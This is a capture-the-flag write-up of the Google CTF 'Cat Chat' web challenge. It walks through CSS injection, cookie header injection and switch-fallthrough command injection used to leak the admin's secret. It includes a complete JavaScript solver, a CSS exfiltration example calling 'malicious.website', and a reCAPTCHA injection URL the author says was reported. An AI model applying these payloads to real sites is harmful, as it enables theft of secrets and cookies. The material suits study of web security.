# Cat Chat &ndash; write-up by @terjanq


## Description

> Welcome to Cat Chat! This is your brand new room where you can discuss anything related to cats. You have been assigned a random nickname that you can change any time.

> Rules:
> - You may invite anyone to this chat room. Just share the URL.
> - Dog talk is strictly forbidden. If you see anyone talking about dogs, please report the incident, and the admin will take the appropriate steps. This usually means that the admin joins the room, listens to the conversation for a brief period and bans anyone who mentions dogs.

> Commands you can use: (just type a message starting with slash to invoke commands)
>  - `/name YourNewName` - Change your nick name to YourNewName.
>  - `/report` - Report dog talk to the admin.
>  
> Btw, the core of the chat engine is open source! You can download the source code [here](./files/server.js).
>
> Alright, have fun!


In the source code we also can find the commented section containing the commands for administrative purposes.

> Admin commands: 
> - `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.
> - `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).

### So our goal is simple. Find a way to steal the admin's password!


## Page Functionality
After reading the provided sources of the website, I came to the following conclusions:
- *Every request to the API (`/report`, `/secret <password>`, `/ban <name>`, `<message>`, `/name <new name>`) is made by `GET` request in the form of: `https://cat-chat.web.ctfcompetition.com/room/<room id>/send?name=<name>&msg=<message>`*
- *There are no session cookies. The only cookies received from the server are: `flag=` which stands for the secret password set by `/secret` command and `banned=` determining whether the user has been banned for d\*ggish talk.*
- *There is no mechanism to prevent from [CSRF], except for the `/report` command which is being authorized by the [Google reCAPTCHA]. Well, there is one just before the `switch statements` inside [server.js] but I didn't find out the exact purpose of that line.* 
- *`Content Security Policy` ([CSP]) is as following:*

```
Content-Security-Policy: 
  default-src 'self'; # Default source is `https://cat-chat.web.ctfcompetition.com/*` if no rule matched
  style-src 'unsafe-inline' 'self'; # The source is either inline object `<style>...</style>` or `self` 
  script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; # `self` or from these two domains
  frame-src 'self' https://www.google.com/recaptcha/ # `self` or from `https://www.google.com/recaptcha/*`
```
*So no urls in the form of `data: ...` are allowed and any attempt of downloading a resource from an external domain will be blocked.*
- *There are basicaly two types of the requests which I'll be respectively calling `global` and `private`. The former are those which are being broadcasted to all participants in the chatroom such as `/report` `/ban`, `<message>` and `/name` and the latter being seen only by the user invoking them such as `/rename` and `/secret`. These are handled by the `EventSource` object inside [catchat.js] script.*
- *Data is being escaped only by the client side and it is done with a help of the following function `let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');`*
- *When an admin joins the room he uses exactly the same page as the others but with the function `cleanupRoomFullOfBadPeople()` invoked.*


## CSS Injection
It seems that every parsed element on the website is properly escaped so injecting an additional [DOM Element] is rather impossible. It is done by the `esc(str)` function mentioned earlier which replaces each character `'`, `"`, `<`, `>` with its [HTML Entity] substitute. But there is one improperly escaped element. The element allowing us to do the [CSS Injection]! Let's have a closer look at it.
```js
display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
```
We see that escaping `data.name` this way won't prevent the called vulnerability. I believe that there are either `quotation marks` outside of the `${esc(data.name)}` missed or escaping two additional characters`[` and `]` which should prevent this type of attack. For the sake of an example let's change our name to `i]{} body{background: red} i[i=`. The inserted element (after getting banned for *I ❤ dogs!* message) should look like: `i]{} body{background: red} i[i= was banned.<style>span[data-name^=i]{} body{background: red} i[i=]{color: red; }</style>` which is a completely valid [CSS Code]. Let's try out our payload on the website! 

![css_injection]

Firstly, we used the fact that anyone can join the same room, so we used two windows to observe the outcome. Then we changed our name to the payload above to finally call for an admin just to provoke him with the message *I ❤ dogs!* in a moment he joins. As we can see, every participant's window in the chat room, except the one getting banned, should likely turn into red. 


But how could we use this finding to steal the admin's secret key? Well, this is the question that we have no direct answer on yet but the idea is to generate a proper set of [CSS Selector Rules] sending the sensitive data over. I will shortly explain how these selectors work in a simple example. Suppose we have exactly one `<input id="secret" value="Top Secret Value"/>` element on the page and two selectors `#secret[value^=T]{background: url(http://malicious.website/?ch=T)}` and `#secret[value^=t]{background: url(http://malicious.website/?ch=t)}`. In natural language it translates to *If element of id 'secret' starts with the prefix '&lt;prefix&gt;' set its background value to '&lt;url(...)&gt;'*. The important thing here is that the content from the provided *URL* will not be preloaded. It means that it's only fetched when the element is going to be rendered. Thanks to it, we can get to know each character in the `value` attribute by consistently expanding out the prefix of already known characters.

## Self Injection
But hey, we cannot send any information outside the domains included in the `CSP` header! So how can we acquire it? And what exactly are we going to steal in the first place?

Let's find an answer to the second question first. We know that there is a special command `/secret <new password>` which basically sets a new password with the call of the ``display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`)`` function. This has to be it! We can make the selectors to look like `span[data-secret^=<prefix>]{background: url(...)}`. But we still don't know how exactly could we obtain an information without sending the information out. This is the tricky part. We will use the fact that any `API` call is not being authorized, so making the URL `url(send?name=flag&msg=<prefix>)` shall result with a new message from the *flag* user on the chat containing the prefix of the fetched secret if and only if such element exists on the page. So let's try this out!

![self_injection]

As expected, we got two messages &ndash; one from us, one from an admin.

## Header Injection
Okay, it seems that we have all we need to steal the admin's password. We know that the password will likely start with `CTF{` but any attempt with such payloads had failed... Why isn't it working? This is why: *“It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.”*. Admin already joined with the password set in the cookie so there is no element on the page we need! 
Maybe if somehow we had forced the admin to send the command `/secret` on the page we could get what we seek? Could we include it in the `background: url(send?name=admin&msg=/secret)` as an URL? Sadly no, we can not. It is because the `/secret` command is a type of `private` and there is no way we could process back the response from the call. Maybe we could somehow make the `/secret` command `public` and broadcast it to all users? Let's move away from this crazy idea for a while and focus on how exactly changing the password would help us. We don't want to know the changed secret, we want to know the original one! I've tested whether we can change the admin's password at all by sending a payload with the url `/send?msg=/secret 12345` followed by the `/ban <me>` command to see if I'll get banned. And Nah, it's now working. I mean the idea ain't working because I am legitely not getting banned!

Let's have a closer look at the `/secret <arg[1]>` instruction provided inside the [server.js] script. 
```js
if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
```
This looks like the [Header Injection]! Well, although we cannot insert [CRLF] \(**C**ariage-**R**eturn **L**ine-**F**eed) characters to make the whole response as we wish due to sanizitaion by the `Node.js`, we can make the cookie invalid! Imagine the following header: `Set-cookie: flag=123456; Domain=adsad; Path=/; Max-Age-31536000` created from the command `/secret 123456; Domain=adsad`. We can read from the [documentation] that
> Domain=&lt;domain-value&gt;  
>
>  Specifies those hosts to which the cookie will be sent. If not specified, defaults to the host portion of the current document location (but not including subdomains). Contrary to earlier specifications, leading dots in domain names are ignored. If a domain is specified, subdomains are always included.

And later
> A cookie belonging to a domain that does not include the origin server should be rejected by the user agent.

So we can send a valid header with an invalid cookie. This is exactly what we need! The browser will reject the new cookie and the script will handle the `/secret` commands at the same time so the `display()` function will be invoked!

![header_injection]

## Command Injection Failure
Up to this moment, I went through all the steps fairly quickly. I thought then that only minutes divided me from the solution and there were no solves on the task yet as I recall correctly. But my excitation was premature and I got lost in it so badly... 

The solution is quite simple and I was almost there if I had only made the correct payload in time.  
I looked at the following piece of [server.js] code

```js
if (!(req.headers.referer || '').replace(/^https?:\/\//, '').startsWith(req.headers.host)) {
    response = {type: "error", error: 'CSRF protection error'};
  } else if (msg[0] != '/') {
    broadcast(room, {type: 'msg', name, msg});
  } else {
    switch (msg.match(/^\/[^ ]*/)[0]) {
      case '/name':
        if (!(arg = msg.match(/\/name (.+)/))) break;
        response = {type: 'rename', name: arg[1]};
        broadcast(room, {type: 'name', name: arg[1], old: name});
      case '/ban':
        if (!(arg = msg.match(/\/ban (.+)/))) break;
        if (!req.admin) break;
        broadcast(room, {type: 'ban', name: arg[1]});
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
      case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
    }
  }
```
and my thoughts were: 
* **There are no breaks in the switch statement**
* **only the first [RegExp]** `msg.match(/^\/[^ ]*/)[0]` correctly matches the command code (start of the `msg` value) and the ones inside switch statement (e.x `/\/name (.+)/`) match occurence of the command regardless the position of the *slash* character in word. 

So, I tested the payload `/name super_name /secret 123456` hoping I shall see two commands from one message executed but it didn't work... I had yet tested a few similar payloads with slight modifications but after a failure, I assumed that it has to be that switches in *JavaScript* work the way *IFs* would work. I know, I know. Cleverest assumption of the day. 

If you read up to this place you probably know the complete solution already but before revealing it, I will try to reproduce my thinking process after rejecting that possibility. If you don't wish to read the part not exactly related to the solution, just jump into [The Command Injection Once More](#the-command-injection-once-more) :)

I don't remember the exact order of the things I have tried, but it does not really matter at this point. 
Here are some interesting findings I had discovered.

### X-Forwarded-For

There is a misterious piece of code in the [server.js] source.
```js
case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
```
It looks at least very very suspicious. The exact line I am thinking of is `var ip = req.headers['x-forwarded-for'];`. When we type `/report` in the chat our IP is beeing sent over to the admin, but purpose of it is highly unknow since we lack the knowledge of the `const admin = require('./admin');` module. But the idea itself of forging my *IP* by crafting the [HTTP header] `x-forwarded-for` to anything I desire seemed to me like a something definitely worth a try. I tested over for any kind of injection that came to my head starting with the [CSRF], ending with the [SQL Injection], and with [XSS Injection] in the middle, but assumed none of these actually worked since I didn't get any outcome. 

### Searching for broadcast
After that, I had decided to run my own instance of the server and test things out locally. I had tried really hard to call the `broadcast(room, msg)` function with the `/secret` command injected, hoping that there is a part of code on the client side, I hadn't yet found, allowing me to execute two commands from one message in there. This attempt was of course badly unsuccessful and the payloads I was creating were ridiculous by looking at them from the time perspective. The only good thing that came out from it, was that I successfully created my own instance of the server which helped to test things out more effectively.


### Searching for XSS
Even though I assumed there was no possibility of [XSS Injection], and if there was any the whole solution would zip into one-line solution and on the other hand, the path I already followed seemed to be the correct one, I was searching for possible `XSS` point on the website. And surprisingly I have found one! I found a vulnerability in the [Google reCAPTCHA] functionality. 
`<script src="https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu"></script>`. I have made a closer look at this script and tried to inject some *XSS* in here. I found the line in the [api.js] looking like dynamically created `... ).push('6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');window ...`, so I tried to insert the quote character `'` to close the function call in order to insert some more code. As for the surprise, it worked! But when one tries to insert any `alphanumeric` character after it, the line changes to: `push('onload')`. So the challenge is to write a payload without using such characters. Well, we all know [JSFuck] and creating the URL: [https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');&#x5B;&#x5D;&#x5B;(!&#x5B;&#x5D;+&#x5B;&#x5D;)...();('] produces a valid JavaScript code which when attached pops out the `alert(1)`. This is a serious security gap since this can be easily used to bypass [CSP] protection on third-party websites. Just for the sake of an example, if we found a place to inject `<script>` element on the website from this task we could execute any code we want even though [CSP] was set to prevent such situations.  
I had reported this vulnerability and now it's patched. More about my report can be found [here](https://github.com/terjanq/google-reported-issue#improper-parameter-sanitization).


It totally buzzed me out so I couldn't focus on the task anymore. I was searching for a way to exploit it further, but it's not the actual subject of this write-up so let's skip it ;)

### The Command Injection Once More
After a whole daybreak, I finally realized what mistake I was making and why my `switch exploits` didn't work. If you look closer at the switch statements once more, you realize that there is actually a `break` between `/name` and `/secret` commands! It does seem so much invisible because it's hidden after `if` statement which looks kind of natural, at least for me. So testing the payload `/ban cat_hater /secret 123456; Domain=adsad` on my local instance resulted with successfully attached `/secret` command because between these two there is no `break`. We can find that an admin sends the `/ban` command following the definition of function below
```js
if (msg.match(/dog/i)) {
        send(`/ban ${name}`);
```
So all we have to do is to send some dirty **d\*ggish message** with a name set to `cat_hater /secret 123456; Domain=asdasd` 

![command_injection]


## The complete Solution
To automate the whole process, I have written a simple [cat_talks_solver.user.js] script, which could be included inside [Tampermonkey] extension. I have also provided with the minified version of the script [cat_talks_minified.js] where the command is very easy to copy-paste into [console]. I encourage you to reproduce all the steps by yourself, so just choose the option fits you the most and try it out! This is almost the exact function I had used during the competition: 

```js
(function(){
  let pref = 'aa]{}#conversation{overflow-x:hidden}';
  let suf = 'a[x=';
  let flag_style = 'span[data-name=flag], span[data-name=flag] + span{color:red; font-size: 15px}';
  let solve = false;
  window.flag = 'CTF{';
  window.messagebox.placeholder = '!solve type to make machine start';
  let h1 = document.createElement('h1');h1.innerHTML='🔒 The Secret Stealer 🔒';
  document.querySelector('#conversation p').before(h1);

  window.report = () => {
      window.grecaptcha.execute(recaptcha_id, {action: 'report'}).then((token) => send('/report ' + token));
  }

  window.sendMessage = function(name, msg){
    fetch(`send?name=${encodeURIComponent(name)}&msg=${encodeURIComponent(msg)}`);
  }

  window.showDogLove = (name) => sendMessage(name, 'I ❤ dogs!');

  window.template = function(middle=''){
      var res = '';
      var alph = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!-?@_{}~';
      for (let c of alph){
          let _flag = (window.flag + c).replace(/{/g, '\\7b').replace(/}/g, '\\7d');
          res += `span[data-secret^=${_flag}]{background:url(send?name=flag&msg=${_flag})}`;
      }
      return pref+middle+res+suf;
  }

  function autoFetch() {
    let last = window.conversation.lastElementChild;
    var interval = setInterval(function() {
      var p;
      while (p = last.nextElementSibling) {
        last = p;

        if (p.tagName != 'P' || p.children.length < 2) continue;
        let name = p.children[0].innerText;
        let msg = p.children[1].innerText;

        if(msg == '!solve'){
            solve = true;
            sendMessage('bot', "I has made the machine start!");  
            window.report();
            break;
        }
        if(!solve) break;

        if(/CTF{.+}/.test(window.flag)) {
            setTimeout(sendMessage, 1000, 'flag', window.flag);
            solve=false;
            clearInterval(interval);
            break;
        }

        if(name == 'flag'){
            window.flag = msg;
            window.showDogLove(template());
            break;
        }
        if(name == 'admin'){
            if(msg == 'Bye') window.report();
            if(msg.startsWith("I've been notified")){
                window.showDogLove(template(flag_style));
                window.showDogLove('/secret 123; Domain=asdasd'); 
            }
            break;
        }
      }
    }, 100);
  }

  autoFetch();

})()
```
### And this is the script in action, very satisfying to watch! 

![solution]

We can see the flag already.  
Flag: **CTF{L0LC47S_43V3R}**

## My thoughts
I think I got very unlucky with the task and as I recall correctly I had huge chances to hit the first solve on the problem (had 8-10th on the *JS Safe 2.0* already). 

After all, the solution consisted of multiple vulnerabilities such as [CSS Injection](#css-injection), [Header Injection](#header-injection), [RegExp Injection](#command-injection-failure), [Insecure Switch Statement](#command-injection-failure) and [Self Injection](#self-injection) used to fetch the flag. So, in my opinion, the task has a good educational potential.

Personally, I enjoyed the task very much even though it cost me a significant bunch of hair :))

___ 

## Resources:
* [https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)](https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005))
* [https://www.owasp.org/index.php/HTTP_Response_Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting)
* [https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [https://www.owasp.org/index.php/CRLF_Injection](https://www.owasp.org/index.php/CRLF_Injection)

* [https://www.w3schools.com/html/html_entities.asp](https://www.w3schools.com/html/html_entities.asp)
* [https://www.w3schools.com/jsref/dom_obj_all.asp](https://www.w3schools.com/jsref/dom_obj_all.asp)
* [https://www.w3schools.com/html/html_css.asp](https://www.w3schools.com/html/html_css.asp)
* [https://www.w3schools.com/cssref/css_selectors.asp](https://www.w3schools.com/cssref/css_selectors.asp)

* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
* [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)


* [https://developers.google.com/web/tools/chrome-devtools/console/](https://developers.google.com/web/tools/chrome-devtools/console/)
* [https://www.google.com/recaptcha/intro/v3beta.html](https://www.google.com/recaptcha/intro/v3beta.html)

## My GitHub profile:
* [https://github.com/terjanq](https://github.com/terjanq)



___
[CSS Injection]: <https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)>
[CRLF]: <https://www.owasp.org/index.php/CRLF_Injection>
[CSRF]: <https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)>
[Header Injection]: <https://www.owasp.org/index.php/HTTP_Response_Splitting>
[SQL Injection]: <https://www.owasp.org/index.php/SQL_Injection>
[XSS Injection]: <https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)>

[CSS Code]: <https://www.w3schools.com/html/html_css.asp>
[HTML Entity]: <https://www.w3schools.com/html/html_entities.asp>
[DOM Element]: <https://www.w3schools.com/jsref/dom_obj_all.asp>
[CSS Selector Rules]: <https://www.w3schools.com/cssref/css_selectors.asp>

[documentation]: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie>
[RegExp]: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions>
[HTTP Header]: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers>
[CSP]: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>

[Google reCAPTCHA]: <https://www.google.com/recaptcha/intro/v3beta.html>

[Tampermonkey]: <http://tampermonkey.net/>
[console]: <https://developers.google.com/web/tools/chrome-devtools/console/>


[solution]: <./gifs/solution.gif>
[command_injection]: <./gifs/command_injection.gif>
[css_injection]: <./gifs/css_injection.gif>
[header_injection]: <./gifs/header_injection.png>
[self_injection]: <./gifs/self_injection.png>


[server.js]: <./files/server.js>
[catchat.js]: <./files/catchat.js>

[cat_talks_solver.user.js]: <./cat_talks_solver.user.js>
[cat_talks_minified.js]: <./cat_talks_solver_minified.js>

[Issue]: <https://issuetracker.google.com/issues/111032474>

[JSFuck]: <http://www.jsfuck.com/>
[api.js]: <https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu>
[https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');&#x5B;&#x5D;&#x5B;(!&#x5B;&#x5D;+&#x5B;&#x5D;)...();(']: <https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu%27%29%3b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%5b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%28%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%29%28%29%3b%28%27)>